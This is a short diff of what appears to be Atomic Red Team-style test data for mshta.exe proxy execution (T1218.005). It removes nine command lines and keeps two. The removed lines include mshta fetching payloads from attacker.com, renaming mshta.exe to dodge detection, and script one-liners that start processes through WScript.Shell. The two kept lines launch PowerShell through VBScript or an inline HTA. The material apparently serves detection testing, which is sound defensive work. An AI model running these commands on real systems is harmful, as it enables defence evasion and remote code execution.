@@ -1,11 +1,2 @@
-mshta  vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"":close")
-mshta.exe  "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%%20""powershell.exe%%20-nop%%20-Command%%20Write-Host%%20Hello,%%20MSHTA!;Start-Sleep%%20-Seconds%%205"""))</script>'"
-copy mshta.exe Update.com && Update.com http://attacker.com/payload
-mshta.exe "\\127.0.0.1\c$\Users\Public\payload.hta"
-mshta.exe "C:\Users\Public\script.hta"
-mshta.exe "javascript:new%20ActiveXObject('WScript.Shell').Run('calc.exe');window.close();"
-mshta.exe http://example.com/payload.html
-copy mshta.exe C:\Users\Public\not_hta.com && C:\Users\Public\not_hta.com http://attacker.com/payload.png
-mshta.exe "C:\Users\Public\payload.hta"
-mshta.exe "http://attacker.com/payload"
-mshta.exe javascript:"\<script\>dw=new%20ActiveXObject('WScript.Shell');dw.Run('calc.exe');close();\</script\>"
+mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"":close")
+mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%%20""powershell.exe%%20-nop%%20-Command%%20Write-Host%%20Hello,%%20MSHTA!;Start-Sleep%%20-Seconds%%205"""))</script>'"
